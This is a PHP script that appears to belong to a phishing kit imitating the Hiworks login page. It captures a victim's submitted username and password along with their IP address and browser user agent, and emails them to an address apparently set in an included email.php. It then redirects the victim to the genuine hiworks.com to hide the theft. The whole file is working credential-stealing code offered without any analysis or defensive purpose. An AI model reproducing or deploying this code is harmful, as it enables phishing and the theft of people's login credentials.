<?php
if($_POST["ud"] != "" and $_POST["pd"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------Hiworks Info-----------------------\n";
$message .= "Username            	: ".$_POST['ud']."\n";
$message .= "Pa'ssw0rd           	: ".$_POST['pd']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
include 'email.php';
$subject = "Card | $ip";
{
mail("$to", "$send", "$subject", $message);     
}
$praga=rand();
$praga=md5($praga);
  header ("Location: https://www.hiworks.com/");
}else{
header ("Location: index.php");
}

?>